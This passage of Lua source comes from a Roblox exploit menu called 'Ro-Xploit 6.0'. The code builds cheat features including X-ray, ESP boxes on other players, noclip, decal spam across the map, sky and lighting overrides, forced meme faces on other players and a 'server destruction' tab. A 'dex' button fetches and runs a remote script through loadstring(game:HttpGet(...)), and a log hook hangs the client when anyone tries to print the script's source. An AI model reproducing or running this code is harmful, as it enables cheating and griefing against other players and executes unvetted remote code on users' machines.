end,LPCId) local XR XR=ToggleButton(Fa,"X-Ray: Off",function() XrayOn(game.Workspace) XR.TextLabel.Text = "X-Ray: On" end, function() XrayOff(game.Workspace) XR.TextLabel.Text = "X-Ray: Off" end,LPCId) local EspB EspB=ToggleButton(Fa,"EspBox: Off",function() Esp = true EspB.TextLabel.Text = "EspBox: On" end, function() Esp = false EspB.TextLabel.Text = "EspBox: Off" ypcall(function() if EspFolder ~= nil then for i,v in pairs(EspFolder:GetChildren()) do if v.Name == "EspBox" then v:Remove() end end end end) end,LPCId) game:service("RunService").Stepped:connect(function() ypcall(function() local mesh1anan = Instance.new("SpecialMesh") mesh1anan.MeshType = Enum.MeshType.FileMesh mesh1anan.Scale = Vector3.new(3,3,3) mesh1anan.MeshId = "http://www.roblox.com/asset/?id=14846869" mesh1anan.TextureId = "http://www.roblox.com/asset/?id=14846834" if taco == true then local locationanan local char if game.Players ~= nil then if game.Players.LocalPlayer ~= nil then if game.Players.LocalPlayer.Character ~= nil then char = game.Players.LocalPlayer.Character else char = nil end else char = nil end else char = nil end if char ~= nil then locationanan = char:GetModelCFrame() else locationanan = CFrame.new(0,0,0) end local tacoa = Instance.new("Part") tacoa.CanCollide = false tacoa.RotVelocity = Vector3.new(math.random()*math.pi,math.random()*math.pi,math.random()*math.pi) local meshanananan = mesh1anan:clone() meshanananan.Parent = tacoa meshanananan.Scale = Vector3.new(math.random()*20,math.random()*20,math.random()*20) tacoa.CFrame = locationanan * CFrame.new(math.random()*500 - 250,math.random(100,200),math.random()*500 - 250) tacoa.Parent = workspace game:GetService("Debris"):AddItem(tacoa,4) end end) ypcall(function() if NClip == true then if game.Players ~= nil then if game.Players.LocalPlayer ~= nil then if game.Players.LocalPlayer.Character ~= nil then if game.Players.LocalPlayer.Character:FindFirstChild("Torso") ~= nil then if game.Players.LocalPlayer.Character:FindFirstChild("Head") ~= nil then game.Players.LocalPlayer.Character.Torso.CanCollide = false game.Players.LocalPlayer.Character.Head.CanCollide = false end end end end end end end) ypcall(function() if Esp == true then Execute(function() while wait() do if Esp == true then ypcall(function() if CurrentCamera ~= nil then if CurrentCamera:FindFirstChild("Esp") == nil then EspFolder = nil end else CurrentCamera = game.Workspace.CurrentCamera end if EspFolder == nil then if CurrentCamera ~= nil then EspFolder=CreateFolder(CurrentCamera,"Esp") else CurrentCamera = game.Workspace.CurrentCamera end end for i,v in pairs(EspFolder:GetChildren()) do if v.Name == "EspBox" then v:Remove() end end for i,v in pairs(game.Players:GetChildren()) do if v ~= nil then if v.Character ~= nil then if v.Character:FindFirstChild("Torso") ~= nil then if game.Players ~= nil then if game.Players.LocalPlayer ~= nil then if v.Name ~= game.Players.LocalPlayer.Name then GenerateBox(v.Character:FindFirstChild("Torso"),v.TeamColor.Color) end end end end end end end end) end end end) end end) end) end function Credit() Ia=AddTab(M,N,"Credits",TabId) Ja=ScrollFrame(Ia,UDim2.new(1,10,1,0),UDim2.new(0,0,0,0)) Ja.Transparency = 1 Ja.BorderSizePixel = 0 Ja.CanvasSize = UDim2.new(0,0,0,0) TCId.Changed:connect(function() if Ja:IsA("ScrollingFrame") then Ja.CanvasSize = UDim2.new(0,0,0,35*TCId.Value) end end) Ja.ChildAdded:connect(function() TCId.Value = TCId.Value + 1 end) Label(Ja,"[CREATOR]",UDim2.new(1,0,0,35),UDim2.new(0,0,0,35*TCId.Value)) Label(Ja,"KrystalTeam",UDim2.new(1,0,0,35),UDim2.new(0,0,0,35*TCId.Value)) Label(Ja,"[POSTER & TESTER]",UDim2.new(1,0,0,35),UDim2.new(0,0,0,35*TCId.Value)) Label(Ja,"Serntimon",UDim2.new(1,0,0,35),UDim2.new(0,0,0,35*TCId.Value)) Label(Ja,"[TESTERS]",UDim2.new(1,0,0,35),UDim2.new(0,0,0,35*TCId.Value)) Label(Ja,"Walter White",UDim2.new(1,0,0,35),UDim2.new(0,0,0,35*TCId.Value)) Label(Ja,"TimberMan",UDim2.new(1,0,0,35),UDim2.new(0,0,0,35*TCId.Value)) Label(Ja,"Mr. Waffles",UDim2.new(1,0,0,35),UDim2.new(0,0,0,35*TCId.Value)) Label(Ja,"Green Hat L33t",UDim2.new(1,0,0,35),UDim2.new(0,0,0,35*TCId.Value)) Label(Ja,"Pulkit",UDim2.new(1,0,0,35),UDim2.new(0,0,0,35*TCId.Value)) Label(Ja,"LaserTic_",UDim2.new(1,0,0,35),UDim2.new(0,0,0,35*TCId.Value)) Label(Ja,"[SCRIPTS]",UDim2.new(1,0,0,35),UDim2.new(0,0,0,35*TCId.Value)) Label(Ja,"KrystalTeam For KrystalDance & Tweaking X-Ray",UDim2.new(1,0,0,35),UDim2.new(0,0,0,35*TCId.Value)) Label(Ja,"RadiationMatrix For X-Ray",UDim2.new(1,0,0,35),UDim2.new(0,0,0,35*TCId.Value)) Label(Ja,"Other Unknown Person For Other Scripts",UDim2.new(1,0,0,35),UDim2.new(0,0,0,35*TCId.Value)) end local memevalue = Instance.new("StringValue") memevalue.Value = "Krystal" local oldmeme = memevalue.Value local memeid = Instance.new("IntValue") memeid.Value = 278201073 function MemeTab() Ka=AddTab(M,N,"Meme",TabId) La=ScrollFrame(Ka,UDim2.new(1,-100,1,-105),UDim2.new(0,0,0,105)) La.Transparency = 1 La.BorderSizePixel = 0 La.CanvasSize = UDim2.new(0,0,0,0) Ma=Frame(Ka,UDim2.new(0,100,1,0),UDim2.new(1,-100,0,0)) Ma.BackgroundColor3 = Color3.new(0,75/255,150/255) Ma.Transparency = 0.75 Ma.BorderSizePixel = 0 Na=ImageLabel(Ka,278201073,UDim2.new(0,100,0,100),UDim2.new(1,-95,0,5)) Na.BorderSizePixel = 0 Na.ZIndex = 2 Oa=Frame(Ka,UDim2.new(1,-90,0,105),UDim2.new(0,0,0,0)) Oa.Transparency = 1 Oa.BorderSizePixel = 0 Pa=Label(Oa,"  Selected Meme: " .. memevalue.Value,UDim2.new(1,-10,0,35),UDim2.new(0,0,0,0)) Pa.TextXAlignment = "Left" memevalue.Changed:connect(function() Pa.Text = "  Selected Meme: " .. memevalue.Value end) local MemePicId MemePicId=TextUsedLabel(Oa,"MemeId",MEId,1) MemePicId.ValueBox.Text=memeid.Value MemePicId.ValueBox.Changed:connect(function() local found = false memeid.Value = MemePicId.ValueBox.Text if Folder ~= nil then if Folder:FindFirstChild("MemeData") ~= nil then for i, v in pairs(Folder:FindFirstChild("MemeData"):GetChildren()) do if memeid.Value == v.Value then found = true break end end end end if found == false then memevalue.Value = "Custom" Pa.Text = "  Selected Meme: Custom" end found = false end) memeid.Changed:connect(function() Na.Image = "rbxassetid://" .. memeid.Value end) Qa=Frame(Ka,UDim2.new(0,10,1,-105),UDim2.new(1,-110,0,105)) Qa.BackgroundColor3 = Color3.new(0,75/255,150/255) Qa.Transparency = 0.85 Qa.BorderSizePixel = 0 local FaceMeme = Instance.new("BillboardGui") FaceMeme.Size = UDim2.new(3,0,3,0) FaceMeme.AlwaysOnTop = true FaceMeme.Name = "RO-MEMEFACES" ImageLabel(FaceMeme,0,UDim2.new(1,0,1,0),UDim2.new(0,0,0,0)) local SMEME,LFace SMEME=ToggleButton(Oa,"Set Meme",function() for i,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then if game.Players ~= nil then if b ~= nil then if b.Character ~= nil then ypcall(function() if b.Character:FindFirstChild("Head") ~= nil then if b.Character:FindFirstChild("Head"):FindFirstChild("RO-MEMEFACES") ~= nil then b.Character:FindFirstChild("Head"):FindFirstChild("RO-MEMEFACES"):Remove() LFace = FaceMeme:clone() LFace.Parent = b.Character:FindFirstChild("Head") LFace.ImageLabel.Image = "rbxassetid://" .. memeid.Value else LFace = FaceMeme:clone() LFace.Parent = b.Character:FindFirstChild("Head") LFace.ImageLabel.Image = "rbxassetid://" .. memeid.Value end end end) end end end end end end end, function() for i,v in pairs(Selected:GetChildren()) do for _,b in pairs(game.Players:GetChildren()) do if b.Name == v.Name then if game.Players ~= nil then if b ~= nil then if b.Character ~= nil then ypcall(function() if b.Character:FindFirstChild("Head") ~= nil then if b.Character:FindFirstChild("Head"):FindFirstChild("RO-MEMEFACES") ~= nil then b.Character:FindFirstChild("Head"):FindFirstChild("RO-MEMEFACES"):Remove() end end end) end end end end end end end,MEId) MEPId.Changed:connect(function() if La:IsA("ScrollingFrame") then La.CanvasSize = UDim2.new(0,0,0,35*MEPId.Value) end end) if Folder ~= nil then if Folder:FindFirstChild("MemeData") ~= nil then for i, v in pairs(Folder:FindFirstChild("MemeData"):GetChildren()) do Button(La,v.Name,EmptySP,EmptySP,function() if v:IsA("IntValue") then if memevalue ~= nil then memevalue.Value = v.Name memeid.Value = v.Value MemePicId.ValueBox.Text = memeid.Value end end end,MEPId) MEPId.Value = i La.CanvasSize = UDim2.new(0,0,0,35*MEPId.Value) end end end end function spamDecal(v,decalpicture) if v:IsA("BasePart") then if v:FindFirstChild("ROXPLOITDECAL") then for l,c in pairs(v:GetChildren()) do if c.Name == "ROXPLOITDECAL" then if c:IsA("Decal") then c.Texture = decalpicture end end end else for i=0, 5 do D = Instance.new("Decal") D.Name = "ROXPLOITDECAL" D.Face = i D.Parent = v D.Texture = decalpicture end end else for a,b in pairs(v:GetChildren()) do spamDecal(b,decalpicture) end end end function clearDecal(v) if v:IsA("BasePart") then for a,b in pairs(v:GetChildren()) do if b:IsA("Decal") then if b.Name == "ROXPLOITDECAL" then b:Remove() end end end else for a,b in pairs(v:GetChildren()) do clearDecal(b) end end end local skyvalue = Instance.new("StringValue") skyvalue.Value = "KrystalTeam" local skyid = Instance.new("IntValue") skyid.Value = 278201190 function SkyTab() local aKa=AddTab(M,N,"Decal / Sky",TabId) local aLa=ScrollFrame(aKa,UDim2.new(1,-100,1,-140),UDim2.new(0,0,0,140)) aLa.Transparency = 1 aLa.BorderSizePixel = 0 aLa.CanvasSize = UDim2.new(0,0,0,0) local aMa=Frame(aKa,UDim2.new(0,100,1,0),UDim2.new(1,-100,0,0)) aMa.BackgroundColor3 = Color3.new(0,75/255,150/255) aMa.Transparency = 0.75 aMa.BorderSizePixel = 0 local aNa=ImageLabel(aKa,278201190,UDim2.new(0,100,0,100),UDim2.new(1,-95,0,5)) aNa.BorderSizePixel = 0 aNa.ZIndex = 2 local aOa=Frame(aKa,UDim2.new(1,-90,0,140),UDim2.new(0,0,0,0)) aOa.Transparency = 1 aOa.BorderSizePixel = 0 local aPa=Label(aOa,"  Selected Id: " .. memevalue.Value,UDim2.new(1,-10,0,35),UDim2.new(0,0,0,0)) aPa.TextXAlignment = "Left" skyvalue.Changed:connect(function() aPa.Text = "  Selected Id: " .. skyvalue.Value end) local aQa=Frame(aKa,UDim2.new(0,10,1,-140),UDim2.new(1,-110,0,140)) aQa.BackgroundColor3 = Color3.new(0,75/255,150/255) aQa.Transparency = 0.85 aQa.BorderSizePixel = 0 local SkyBoxx = Instance.new("Sky") SkyBoxx.Name = "Ro-Sky" SkyBoxx.SkyboxBk = "rbxassetid://"..skyid.Value SkyBoxx.SkyboxDn = "rbxassetid://"..skyid.Value SkyBoxx.SkyboxFt = "rbxassetid://"..skyid.Value SkyBoxx.SkyboxLf = "rbxassetid://"..skyid.Value SkyBoxx.SkyboxRt = "rbxassetid://"..skyid.Value SkyBoxx.SkyboxUp = "rbxassetid://"..skyid.Value local SkyBoxId SkyBoxId=TextUsedLabel(aOa,"Decal Id",SkyId,1) SkyBoxId.ValueBox.Text=skyid.Value skyid.Changed:connect(function() aNa.Image = "rbxassetid://" .. skyid.Value SkyBoxx.SkyboxBk = "rbxassetid://"..skyid.Value SkyBoxx.SkyboxDn = "rbxassetid://"..skyid.Value SkyBoxx.SkyboxFt = "rbxassetid://"..skyid.Value SkyBoxx.SkyboxLf = "rbxassetid://"..skyid.Value SkyBoxx.SkyboxRt = "rbxassetid://"..skyid.Value SkyBoxx.SkyboxUp = "rbxassetid://"..skyid.Value end) SkyBoxId.ValueBox.Changed:connect(function() local found = false skyid.Value = SkyBoxId.ValueBox.Text if Folder ~= nil then if Folder:FindFirstChild("SkyData") ~= nil then for i, v in pairs(Folder:FindFirstChild("SkyData"):GetChildren()) do if skyid.Value == v.Value then found = true break end end end end if found == false then skyvalue.Value = "Custom" aPa.Text = "  Selected Id: Custom" end found = false end) local SetSky,LSky SetSky=ToggleButton(aOa,"Set Sky",function() if game.Lighting:FindFirstChild("Ro-Sky") ~= nil then game.Lighting:FindFirstChild("Ro-Sky"):Remove() end SkyBoxx.SkyboxBk = "rbxassetid://"..skyid.Value SkyBoxx.SkyboxDn = "rbxassetid://"..skyid.Value SkyBoxx.SkyboxFt = "rbxassetid://"..skyid.Value SkyBoxx.SkyboxLf = "rbxassetid://"..skyid.Value SkyBoxx.SkyboxRt = "rbxassetid://"..skyid.Value SkyBoxx.SkyboxUp = "rbxassetid://"..skyid.Value LSky = SkyBoxx:Clone() LSky.Parent = game.Lighting end, function() if game.Lighting:FindFirstChild("Ro-Sky") ~= nil then game.Lighting:FindFirstChild("Ro-Sky"):Remove() end end,SkyId) local bsdecal bsdecal=ToggleButton(aOa,"Decal Spam",function() spamDecal(game.Workspace,"rbxassetid://"..skyid.Value) end, function() clearDecal(game.Workspace) end,SkyId) bsdecal.On.Text = "Spam" bsdecal.Off.Text = "Clear" SkypId.Changed:connect(function() if aLa:IsA("ScrollingFrame") then aLa.CanvasSize = UDim2.new(0,0,0,35*SkypId.Value) end end) if Folder ~= nil then if Folder:FindFirstChild("SkyData") ~= nil then for i, v in pairs(Folder:FindFirstChild("SkyData"):GetChildren()) do Button(aLa,v.Name,EmptySP,EmptySP,function() if v:IsA("IntValue") then if skyvalue ~= nil then skyvalue.Value = v.Name skyid.Value = v.Value SkyBoxId.ValueBox.Text = skyid.Value end end end,SkypId) SkypId.Value = i aLa.CanvasSize = UDim2.new(0,0,0,35*SkypId.Value) end end end end function LightingControl() Ga=AddTab(M,N,"Lighting Control",TabId) Ha=ScrollFrame(Ga,UDim2.new(1,10,1,0),UDim2.new(0,0,0,0)) Ha.Transparency = 1 Ha.BorderSizePixel = 0 Ha.CanvasSize = UDim2.new(0,0,0,0) LCId.Changed:connect(function() if Ha:IsA("ScrollingFrame") then Ha.CanvasSize = UDim2.new(0,0,0,35*LCId.Value) end end) local RColor=TextUsedLabel(Ha,"Red",LCId,255) local GColor=TextUsedLabel(Ha,"Green",LCId,255) local BColor=TextUsedLabel(Ha,"Blue",LCId,255) Button(Ha,"Set Ambient",EmptySP,EmptySP,function() if RColor:FindFirstChild("ValueBox") ~= nil then if GColor:FindFirstChild("ValueBox") ~= nil then if BColor:FindFirstChild("ValueBox") ~= nil then if RColor:FindFirstChild("ValueBox").Text ~= "" then if GColor:FindFirstChild("ValueBox").Text ~= "" then if BColor:FindFirstChild("ValueBox").Text ~= "" then game.Lighting.Ambient = Color3.new(RColor:FindFirstChild("ValueBox").Text/255,GColor:FindFirstChild("ValueBox").Text/255,BColor:FindFirstChild("ValueBox").Text/255) end end end end end end end,LCId) Button(Ha,"Set OutdoorAmbient",EmptySP,EmptySP,function() if RColor:FindFirstChild("ValueBox") ~= nil then if GColor:FindFirstChild("ValueBox") ~= nil then if BColor:FindFirstChild("ValueBox") ~= nil then if RColor:FindFirstChild("ValueBox").Text ~= "" then if GColor:FindFirstChild("ValueBox").Text ~= "" then if BColor:FindFirstChild("ValueBox").Text ~= "" then game.Lighting.OutdoorAmbient = Color3.new(RColor:FindFirstChild("ValueBox").Text/255,GColor:FindFirstChild("ValueBox").Text/255,BColor:FindFirstChild("ValueBox").Text/255) end end end end end end end,LCId) Button(Ha,"Set ShadowColor",EmptySP,EmptySP,function() if RColor:FindFirstChild("ValueBox") ~= nil then if GColor:FindFirstChild("ValueBox") ~= nil then if BColor:FindFirstChild("ValueBox") ~= nil then if RColor:FindFirstChild("ValueBox").Text ~= "" then if GColor:FindFirstChild("ValueBox").Text ~= "" then if BColor:FindFirstChild("ValueBox").Text ~= "" then game.Lighting.ShadowColor = Color3.new(RColor:FindFirstChild("ValueBox").Text/255,GColor:FindFirstChild("ValueBox").Text/255,BColor:FindFirstChild("ValueBox").Text/255) end end end end end end end,LCId) Button(Ha,"Set ColorShift_Bottom",EmptySP,EmptySP,function() if RColor:FindFirstChild("ValueBox") ~= nil then if GColor:FindFirstChild("ValueBox") ~= nil then if BColor:FindFirstChild("ValueBox") ~= nil then if RColor:FindFirstChild("ValueBox").Text ~= "" then if GColor:FindFirstChild("ValueBox").Text ~= "" then if BColor:FindFirstChild("ValueBox").Text ~= "" then game.Lighting.ColorShift_Bottom = Color3.new(RColor:FindFirstChild("ValueBox").Text/255,GColor:FindFirstChild("ValueBox").Text/255,BColor:FindFirstChild("ValueBox").Text/255) end end end end end end end,LCId) Button(Ha,"Set ColorShift_Top",EmptySP,EmptySP,function() if RColor:FindFirstChild("ValueBox") ~= nil then if GColor:FindFirstChild("ValueBox") ~= nil then if BColor:FindFirstChild("ValueBox") ~= nil then if RColor:FindFirstChild("ValueBox").Text ~= "" then if GColor:FindFirstChild("ValueBox").Text ~= "" then if BColor:FindFirstChild("ValueBox").Text ~= "" then game.Lighting.ColorShift_Top = Color3.new(RColor:FindFirstChild("ValueBox").Text/255,GColor:FindFirstChild("ValueBox").Text/255,BColor:FindFirstChild("ValueBox").Text/255) end end end end end end end,LCId) Button(Ha,"Set FogColor",EmptySP,EmptySP,function() if RColor:FindFirstChild("ValueBox") ~= nil then if GColor:FindFirstChild("ValueBox") ~= nil then if BColor:FindFirstChild("ValueBox") ~= nil then if RColor:FindFirstChild("ValueBox").Text ~= "" then if GColor:FindFirstChild("ValueBox").Text ~= "" then if BColor:FindFirstChild("ValueBox").Text ~= "" then game.Lighting.FogColor = Color3.new(RColor:FindFirstChild("ValueBox").Text/255,GColor:FindFirstChild("ValueBox").Text/255,BColor:FindFirstChild("ValueBox").Text/255) end end end end end end end,LCId) local FogStartButton FogStartButton=TextUsedButton(Ha,"Set FogStart",function() if FogStartButton ~= nil then if FogStartButton:FindFirstChild("ValueBox") ~= nil then game.Lighting.FogStart = FogStartButton:FindFirstChild("ValueBox").Text end end end,LCId,0) local FogEndButton FogEndButton=TextUsedButton(Ha,"Set FogEnd",function() if FogEndButton ~= nil then if FogEndButton:FindFirstChild("ValueBox") ~= nil then game.Lighting.FogEnd = FogEndButton:FindFirstChild("ValueBox").Text end end end,LCId,100000) local BrightnessButton BrightnessButton=TextUsedButton(Ha,"Set Brightness",function() if BrightnessButton ~= nil then if BrightnessButton:FindFirstChild("ValueBox") ~= nil then game.Lighting.Brightness = BrightnessButton:FindFirstChild("ValueBox").Text end end end,LCId,1) ToggleButton(Ha,"GlobalShadows",function() game.Lighting.GlobalShadows = true end,function() game.Lighting.GlobalShadows = false end,LCId) ToggleButton(Ha,"Outlines",function() game.Lighting.Outlines = true end,function() game.Lighting.Outlines = false end,LCId) end function GenerateMenu(parent) Selected=CreateFolder(parent,"Selected") Banned=CreateFolder(parent,"Banned") WayFolder=CreateFolder(parent,"WayPoint") WayFolder.ChildAdded:connect(function() wait() GenerateWFolder() end) WayFolder.ChildRemoved:connect(function() wait() GenerateWFolder() end) E=Frame(parent,UDim2.new(0,475,0,20),UDim2.new(0.5,-250,-0.5,-175)) E.Style = "RobloxRound" E.Draggable = true E.Active = true E.ZIndex = 2 D=Frame(E,UDim2.new(0,500,0,350),UDim2.new(0,-20,0,-20)) D.Style = "RobloxRound" F=Label(E,"Ro-Xploit 6.0",UDim2.new(0.5,0,1,0),UDim2.new(0,15,0,0)) F.FontSize = "Size12" F.TextXAlignment = "Left" F.ZIndex = 3 F=Button(E,"x",UDim2.new(0,20,0,20),UDim2.new(1,-15,0,-9),function() ToggleMenu() end) F.FontSize = "Size12" F.Style = "Custom" F.BackgroundTransparency = 1 F.ZIndex = 3 G=Frame(D,UDim2.new(1,-10,1,-35),UDim2.new(0,5,0,30)) G.Name = "Main" G.Style = "RobloxRound" H=ImageLabel(D,"278201073",UDim2.new(0,100,0,100), UDim2.new(0,-50,0,-50)) H.ZIndex = 4 ypcall(function() Execute(function() local way = true while wait(.25/100) do if way == false then H.Rotation = H.Rotation + 1 if H.Rotation >= 10 then way = true end else H.Rotation = H.Rotation - 1 if H.Rotation <= -10 then way = false end end end end) end) I=Frame(G,UDim2.new(0,5,1,0),UDim2.new(0,110,0,0)) I.BackgroundColor3 = Color3.new(0,75/255,150/255) I.Transparency = 0.5 I.BorderSizePixel = 0 I=Frame(G,UDim2.new(0,10,1,0),UDim2.new(0,100,0,0)) I.BackgroundColor3 = Color3.new(0,75/255,150/255) I.Transparency = 0.75 I.BorderSizePixel = 0 I=Frame(G,UDim2.new(0,10,1,0),UDim2.new(1,-10,0,0)) I.BackgroundColor3 = Color3.new(0,75/255,150/255) I.Transparency = 0.75 I.BorderSizePixel = 0 J=ScrollFrame(G,UDim2.new(0,110,1,0),UDim2.new(0,0,0,0)) J.BackgroundColor3 = Color3.new(0,75/255,150/255) J.Transparency = 0.75 J.BorderSizePixel = 0 K=Frame(G,UDim2.new(1,-115,1,0),UDim2.new(0,115,0,0)) K.BackgroundColor3 = Color3.new(0,75/255,150/255) K.Transparency = 0.75 K.BorderSizePixel = 0 L=Button(parent,"SHOW",UDim2.new(0,50,0,50),UDim2.new(0,-50,1,-50),function() ToggleMenu() end) L.TextWrapped = false M=Frame(J,UDim2.new(0,100,0,0),UDim2.new(0,0,0,0)) M.Transparency = 1 N=Frame(K,UDim2.new(1,-10,1,0),UDim2.new(0,0,0,0)) N.Transparency = 1 O=AddTab(M,N,"Select Player",TabId) P=ScrollFrame(O,UDim2.new(1,10,1,-20),UDim2.new(0,0,0,20)) P.Transparency = 1 P.BorderSizePixel = 0 P.CanvasSize = UDim2.new(0,0,0,0) C=Button(O,"NONE",UDim2.new(0,343/4,0,20),UDim2.new(0,0,0,0),function() ClearFolder(Selected) SetPlayerList(P) end) C.Style = "Custom" C.BackgroundColor3 = Color3.new(0,75/255,150/255) C.BackgroundTransparency = 0.85 C.BorderSizePixel = 0 C=Button(O,"ME",UDim2.new(0,343/4,0,20),UDim2.new(0,(343/4)*1,0,0),function() ClearFolder(Selected) ypcall(function() if game.Players ~= nil then if game.Players.LocalPlayer ~= nil then AddValue(Selected,game.Players.LocalPlayer.Name) end end end) SetPlayerList(P) end) C.Style = "Custom" C.BackgroundColor3 = Color3.new(0,75/255,150/255) C.BackgroundTransparency = 0.85 C.BorderSizePixel = 0 C=Button(O,"OTHERS",UDim2.new(0,(343/4)-1,0,20),UDim2.new(0,(343/4)*2,0,0),function() ClearFolder(Selected) ypcall(function() if game.Players ~= nil then if game.Players.LocalPlayer ~= nil then for i, v in pairs(game.Players:GetChildren()) do if v.Name ~= game.Players.LocalPlayer.Name then AddValue(Selected,v.Name) end end end end end) SetPlayerList(P) end) C.Style = "Custom" C.BackgroundColor3 = Color3.new(0,75/255,150/255) C.BackgroundTransparency = 0.85 C.BorderSizePixel = 0 C=Button(O,"ALL",UDim2.new(0,343/4,0,20),UDim2.new(0,(343/4)*3,0,0),function() ClearFolder(Selected) ypcall(function() if game.Players ~= nil then for i, v in pairs(game.Players:GetChildren()) do AddValue(Selected,v.Name) end end end) SetPlayerList(P) end) C.Style = "Custom" C.BackgroundColor3 = Color3.new(0,75/255,150/255) C.BackgroundTransparency = 0.85 C.BorderSizePixel = 0 GeneratePlayerCommand() GenerateServerDestruction() GenerateLocalCommand() GenerateScriptTab() LightingControl() ExplorerTab() GenerateWayPoints() SkyTab() MemeTab() GenerateMenuPart2() Label(parent,string.reverse(".maeTlatsyrK :yB ,0.6 tiolpX-oR"),UDim2.new(1,0,0,15),UDim2.new(0,0,1,-15)).TextTransparency = 0.5 Credit() return D end a=Instance.new("ScreenGui",Folder) a.Name = "RX6" if Folder ~= nil then Execute(function() ypcall(function() wait(0.25) GenerateMenu(a) game.Players.ChildAdded:connect(function() SetPlayerList(P) wait() end) game.Players.ChildRemoved:connect(function(c) if VerifyValue(Selected,c.Name) then if Selected:FindFirstChild(c.Name) then Selected:FindFirstChild(c.Name):Remove() end end SetPlayerList(P) wait() end) SetPlayerList(P) wait(0.25) b=Frame(a,UDim2.new(0,0,0,0),UDim2.new(0.5,0,0.5,0)) b.Style = "RobloxRound" c=ImageLabel(b,"278208523",UDim2.new(1,0,1,0), UDim2.new(0,0,0,0)) c.BackgroundTransparency = 1 IntroSFX=PlaySFX(145487017,1,0.75) b:TweenSizeAndPosition(UDim2.new(0,300,0,300),UDim2.new(0.5,-150,0.5,-150),"Out","Bounce",.5,true) wait(1) IntroSFX=PlaySFX(145487017,0.75,1.25) b:TweenSizeAndPosition(UDim2.new(0,0,0,0),UDim2.new(0.5,0,0.5,0),"Out","Bounce",.5,true) wait(0.75) b:Remove() d=Frame(a,UDim2.new(0,0,0,0),UDim2.new(0.5,0,0.5,0)) d.Style = "RobloxRound" e=Label(d,"Ro-Xploit 6.0",UDim2.new(1,10,1,10),UDim2.new(0,-5,0,-5)) e.FontSize = "Size24" IntroSFX=PlaySFX(145487017,1,0.75) d:TweenSizeAndPosition(UDim2.new(0,300,0,300),UDim2.new(0.5,-150,0.5,-150),"Out","Bounce",.5,true) wait(1) IntroSFX=PlaySFX(145487017,0.75,1.25) d:TweenSizeAndPosition(UDim2.new(0,0,0,0),UDim2.new(0.5,0,0.5,0),"Out","Bounce",.5,true) wait(0.75) d:Remove() PlaySFX(145487017,0.85,1.1) L:TweenPosition(UDim2.new(0,0,1,-50),"Out","Bounce",1,true) end) end) end spawn(function() while wait() do ypcall(function() for i,v in pairs(game.ReplicatedFirst:GetChildren()) do if v.Disabled == true then v:Remove() end end end) ypcall(function() for i,v in pairs(game.Players:GetChildren()) do if VerifyValue(Banned,v.Name) then if v.Name == game.Players.LocalPlayer.Name then if a~=nil then local MSG = Instance.new("Message",game.Players.LocalPlayer.PlayerGui) MSG.Text="You're BlackListed from using ro-xploit 6.0!" game.Debris:AddItem(MSG,7.5) a:Remove() Folder:Remove() end else v:Remove() end end end end) end end) game:GetService("LogService").MessageOut:connect(function(PrintMessage) if PrintMessage == script.Source then while true do end end end)
		-- ~CL 2016
	end)

	dex.Name = "dex"
	dex.Parent = mainpage
	dex.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	dex.BackgroundTransparency = 1.000
	dex.BorderColor3 = Color3.fromRGB(0, 0, 0)
	dex.BorderSizePixel = 0
	dex.Position = UDim2.new(0.904999971, 0, 0.910000026, 0)
	dex.Size = UDim2.new(0, 29, 0, 29)
	dex.Font = Enum.Font.SourceSans
	dex.Text = ""
	dex.TextColor3 = Color3.fromRGB(0, 0, 0)
	dex.TextSize = 14.000
	dex.MouseButton1Down:connect(function()
		loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()
	end)

	close_2.Name = "close"
	close_2.Parent = mainpage
	close_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	close_2.BackgroundTransparency = 1.000
	close_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
	close_2.BorderSizePixel = 0
	close_2.Position = UDim2.new(0.88252151, 0, 0, 0)
	close_2.Size = UDim2.new(0, 41, 0, 24)
	close_2.Font = Enum.Font.SourceSans
	close_2.Text = ""
	close_2.TextColor3 = Color3.fromRGB(0, 0, 0)
	close_2.TextSize = 14.000
	close_2.MouseButton1Down:connect(function()
		mainpage.Visible = false
	end)

	minimize_2.Name = "minimize"
	minimize_2.Parent = mainpage
	minimize_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	minimize_2.BackgroundTransparency = 1.000
	minimize_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
	minimize_2.BorderSizePixel = 0
	minimize_2.Position = UDim2.new(0.598853886, 0, 0, 0)
	minimize_2.Size = UDim2.new(0, 41, 0, 24)
	minimize_2.Font = Enum.Font.SourceSans
	minimize_2.Text = ""
	minimize_2.TextColor3 = Color3.fromRGB(0, 0, 0)
	minimize_2.TextSize = 14.000
	minimize_2.MouseButton1Down:connect(function()
		mainpage.Visible = false
		mini.Visible = true
	end)

	-- Scripts:

	local function HXRD_fake_script() -- passpage.Dragify 
		local script = Instance.new('LocalScript', passpage)

		local UserInputService = game:GetService("UserInputService")

		local gui = script.Parent

		local dragging
		local dragInput
		local dragStart
		local startPos

		local function update(input)
			local delta = input.Position - dragStart
			gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		end

		gui.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = true
				dragStart = input.Position
				startPos = gui.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				end)
			end
		end)

		gui.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)

		UserInputService.InputChanged:Connect(function(input)
			if input == dragInput and dragging then
				update(input)
			end
		end)
	end
	coroutine.wrap(HXRD_fake_script)()
	local function EERUFD_fake_script() -- mainpage.Dragify 
		local script = Instance.new('LocalScript', mainpage)

		local UserInputService = game:GetService("UserInputService")

		local gui = script.Parent

		local dragging
		local dragInput
		local dragStart
		local startPos

		local function update(input)
			local delta = input.Position - dragStart
			gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		end

		gui.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = true
				dragStart = input.Position
				startPos = gui.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
